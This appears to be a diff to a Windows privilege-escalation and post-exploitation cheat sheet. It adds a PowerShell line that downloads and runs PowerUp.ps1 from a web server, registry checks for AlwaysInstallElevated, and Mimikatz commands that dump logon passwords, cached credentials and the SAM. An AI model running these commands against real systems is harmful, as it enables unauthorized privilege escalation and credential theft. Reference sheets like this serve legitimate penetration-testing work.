@@ -697,10 +697,20 @@ type C:\Windows\system32\drivers\etc\hosts
 
 
 
-PowerUp.ps1
+PowerUp.ps1 (Sometimes a Quick Win)
 
 ```powershell
 powershell.exe /c IEX(New-Object Net.WebClient).downloadString('webserver/PowerUp.ps1') ;Invoke-AllChecks
+```
+
+
+
+SharpUp
+
+```powershell
+#https://github.com/GhostPack/SharpUp
+
+C Sharp Implementation of PowerUp.ps1 which can be reflectively loaded.
 ```
 
 
@@ -894,6 +904,10 @@ Check for AlwaysInstalledElevated Reg Key
 
 ```powershell
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+Get-ItemProperty HKLM\Software\Policies\Microsoft\Windows\Installer
+Get-ItemProperty HKCU\Software\Policies\Microsoft\Windows\Installer
+reg query HKLM\Software\Policies\Microsoft\Windows\Installer
+reg query HKCU\Software\Policies\Microsoft\Windows\Installer
 ```
 
 
@@ -1209,6 +1223,20 @@ and send the .bin to Mimikatz locally.
 sekurlsa::minidump C:\users\m0chan\lssas.dmp
 
 Can also be used for dumping and pass the ticket attacks but will cover this elsewhere.
+
+Mimikatz Guide
+
+#Logon Sessions
+
+sekurlsa::logonPasswords all
+
+#Dump Cache
+
+lsadump::cache
+
+#Dump SAM
+
+lsadump::sam
 ```
 
 
@@ -1258,16 +1286,6 @@ SharpDPAPI
 #https://github.com/GhostPack/SharpDPAPI
 
 Full C Sharp Implementation of Mimikatzs DPAPI features which allows access to DPAPI features.
-```
-
-
-
-SharpUp
-
-```powershell
-#https://github.com/GhostPack/SharpUp
-
-C Sharp Implementation of PowerUp.ps1 which can be reflectively loaded.
 ```
 
 
